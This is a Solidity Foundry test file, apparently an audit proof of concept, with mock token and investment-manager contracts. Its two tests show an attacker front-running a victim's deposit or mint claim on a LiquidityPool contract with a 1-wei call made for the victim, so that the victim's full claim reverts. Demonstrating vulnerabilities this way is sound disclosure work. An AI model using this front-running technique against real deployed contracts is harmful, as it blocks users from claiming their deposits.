// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "../../src/LiquidityPool.sol";

// Mock contracts for testing
contract MockERC20 is IERC20 {
    string public name = "Mock Asset";
    string public symbol = "MASSET";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
}

contract MockTrancheToken is TrancheTokenLike {
    string public name = "Mock Tranche";
    string public symbol = "MTRANCHE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    bytes32 public PERMIT_TYPEHASH;
    bytes32 public DOMAIN_SEPARATOR;
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
    
    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }
    
    function checkTransferRestriction(address, address, uint256) external pure returns (bool) {
        return true;
    }
    
    function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external {}
}

contract MockInvestmentManager is InvestmentManagerLike {
    mapping(address => mapping(address => uint256)) public pendingDeposits;
    mapping(address => mapping(address => uint256)) public claimableShares;
    mapping(address => mapping(address => uint256)) public pendingRedeems;
    mapping(address => mapping(address => uint256)) public claimableAssets;
    
    MockERC20 public asset;
    MockTrancheToken public share;
    
    constructor(address _asset, address _share) {
        asset = MockERC20(_asset);
        share = MockTrancheToken(_share);
    }
    
    function requestDeposit(uint256 assets, address receiver) external {
        asset.transferFrom(receiver, address(this), assets);
        pendingDeposits[msg.sender][receiver] += assets;
    }
    
    function requestRedeem(uint256 shares, address receiver) external {
        share.transferFrom(receiver, address(this), shares);
        pendingRedeems[msg.sender][receiver] += shares;
    }
    
    function processDeposit(address receiver, uint256 assets) external returns (uint256) {
        require(claimableShares[msg.sender][receiver] >= assets, "Not enough claimable shares");
        claimableShares[msg.sender][receiver] -= assets;
        share.mint(receiver, assets);
        return assets;
    }
    
    function processMint(address receiver, uint256 shares) external returns (uint256) {
        require(claimableShares[msg.sender][receiver] >= shares, "Not enough claimable shares");
        claimableShares[msg.sender][receiver] -= shares;
        share.mint(receiver, shares);
        return shares;
    }
    
    function processWithdraw(uint256 assets, address receiver, address) external returns (uint256) {
        claimableAssets[msg.sender][receiver] -= assets;
        asset.transfer(receiver, assets);
        return assets;
    }
    
    function processRedeem(uint256 shares, address receiver, address) external returns (uint256) {
        claimableAssets[msg.sender][receiver] -= shares;
        asset.transfer(receiver, shares);
        return shares;
    }
    
    function executeEpoch(address pool, address user, uint256 shares) external {
        claimableShares[pool][user] += shares;
    }
    
    function maxDeposit(address user, address pool) external view returns (uint256) {
        return claimableShares[pool][user];
    }
    
    function maxMint(address user, address pool) external view returns (uint256) {
        return claimableShares[pool][user];
    }
    
    function maxWithdraw(address user, address pool) external view returns (uint256) {
        return claimableAssets[pool][user];
    }
    
    function maxRedeem(address user, address pool) external view returns (uint256) {
        return claimableAssets[pool][user];
    }
    
    function totalAssets(uint256, address) external pure returns (uint256) {
        return 0;
    }
    
    function convertToShares(uint256 assets, address) external pure returns (uint256) {
        return assets;
    }
    
    function convertToAssets(uint256 shares, address) external pure returns (uint256) {
        return shares;
    }
    
    function previewDeposit(address, address, uint256 assets) external pure returns (uint256) {
        return assets;
    }
    
    function previewMint(address, address, uint256 shares) external pure returns (uint256) {
        return shares;
    }
    
    function previewWithdraw(address, address, uint256 assets) external pure returns (uint256) {
        return assets;
    }
    
    function previewRedeem(address, address, uint256 shares) external pure returns (uint256) {
        return shares;
    }
    
    function collectDeposit(address) external {}
    function collectRedeem(address) external {}
    function decreaseDepositRequest(uint256, address) external {}
    function decreaseRedeemRequest(uint256, address) external {}
}

contract LiquidityPoolExploitTest is Test {
    LiquidityPool public pool;
    MockERC20 public asset;
    MockTrancheToken public share;
    MockInvestmentManager public investmentManager;
    
    address public attacker = address(0x1337);
    address public victim = address(0xBEEF);
    
    function setUp() public {
        // Deploy mock contracts
        asset = new MockERC20();
        share = new MockTrancheToken();
        investmentManager = new MockInvestmentManager(address(asset), address(share));
        
        // Deploy LiquidityPool
        pool = new LiquidityPool(
            1, // poolId
            bytes16(uint128(1)), // trancheId
            address(asset),
            address(share),
            address(investmentManager)
        );
        
        // Setup initial balances
        asset.mint(victim, 1000 ether);
        asset.mint(attacker, 1000 ether);
        
        // Approve investment manager
        vm.prank(victim);
        asset.approve(address(investmentManager), type(uint256).max);
        
        vm.prank(attacker);
        asset.approve(address(investmentManager), type(uint256).max);
    }
    
    function testDepositDoS() public {
        // Step 1: Victim requests a deposit of 100 ether
        uint256 victimDepositAmount = 100 ether;
        vm.prank(victim);
        pool.requestDeposit(victimDepositAmount, victim);
        
        console.log("Step 1: Victim requested deposit of", victimDepositAmount);
        console.log("Victim asset balance:", asset.balanceOf(victim));
        
        // Step 2: Epoch executes on Centrifuge side, making shares claimable
        // Simulate epoch execution by setting claimable shares
        investmentManager.executeEpoch(address(pool), victim, victimDepositAmount);
        
        console.log("Step 2: Epoch executed, victim has claimable shares:", investmentManager.maxDeposit(victim, address(pool)));
        
        // Step 3: Attacker front-runs victim's deposit call by depositing 1 wei
        // This consumes 1 wei of victim's claimable shares without victim's consent
        vm.prank(attacker);
        pool.deposit(1, victim);
        
        console.log("Step 3: Attacker front-ran and deposited 1 wei for victim");
        console.log("Victim's remaining claimable shares:", investmentManager.maxDeposit(victim, address(pool)));
        console.log("Victim's share balance:", share.balanceOf(victim));
        
        // Step 4: Victim tries to deposit the full amount but it reverts
        // because attacker already consumed 1 wei of claimable shares
        vm.prank(victim);
        vm.expectRevert("Not enough claimable shares");
        pool.deposit(victimDepositAmount, victim);
        
        console.log("Step 4: Victim's deposit TX reverted as expected");
        
        // Verify the DoS attack succeeded:
        // - Victim cannot claim their full deposit
        // - Attacker successfully prevented victim from claiming
        // - Victim now has 1 wei of shares (from attacker's call) instead of full amount
        assertEq(share.balanceOf(victim), 1, "Victim should only have 1 wei of shares from attacker's call");
        assertEq(investmentManager.maxDeposit(victim, address(pool)), victimDepositAmount - 1, "Victim should have remaining claimable shares minus 1 wei");
    }
    
    function testMintDoS() public {
        // Similar attack vector using mint() instead of deposit()
        
        // Step 1: Victim requests a deposit
        uint256 victimDepositAmount = 100 ether;
        vm.prank(victim);
        pool.requestDeposit(victimDepositAmount, victim);
        
        console.log("Step 1: Victim requested deposit of", victimDepositAmount);
        
        // Step 2: Epoch executes
        investmentManager.executeEpoch(address(pool), victim, victimDepositAmount);
        
        console.log("Step 2: Epoch executed, victim has claimable shares:", investmentManager.maxMint(victim, address(pool)));
        
        // Step 3: Attacker front-runs victim's mint call
        vm.prank(attacker);
        pool.mint(1, victim);
        
        console.log("Step 3: Attacker front-ran and minted 1 wei for victim");
        console.log("Victim's remaining claimable shares:", investmentManager.maxMint(victim, address(pool)));
        
        // Step 4: Victim tries to mint the full amount but it reverts
        vm.prank(victim);
        vm.expectRevert("Not enough claimable shares");
        pool.mint(victimDepositAmount, victim);
        
        console.log("Step 4: Victim's mint TX reverted as expected");
        
        // Verify the DoS attack succeeded
        assertEq(share.balanceOf(victim), 1, "Victim should only have 1 wei of shares from attacker's call");
    }
}